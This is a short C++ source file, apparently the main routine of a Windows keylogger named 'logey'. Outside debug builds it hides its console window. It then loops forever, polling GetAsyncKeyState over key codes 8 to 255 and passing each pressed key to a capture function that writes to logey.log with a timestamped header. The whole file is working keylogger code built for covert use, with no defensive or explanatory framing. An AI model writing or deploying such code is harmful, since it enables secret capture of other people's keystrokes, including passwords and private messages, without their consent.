#include "logey.h"
#define DEBUG
int main() {
#ifndef DEBUG
	FreeConsole(); // Hides the console
#endif // DEBUG

	std::string filename = "logey.log"; // The name of the log file

	createFileHeader(filename);
	createTimeStamp(filename); // Creates a header for the log file each time the logger starts

	while (true) { // Loops forever
		for (int key = 8; key < 256; key++) { // For each key from 8 to 255
			if (GetAsyncKeyState(key) == -32767) { // Check the state of a key
				captureKey(key, filename); // Capture this key
			}
		}
		Sleep(10); // Sleep for 10 milliseconds to reduce CPU usage
	}

	return 0;
}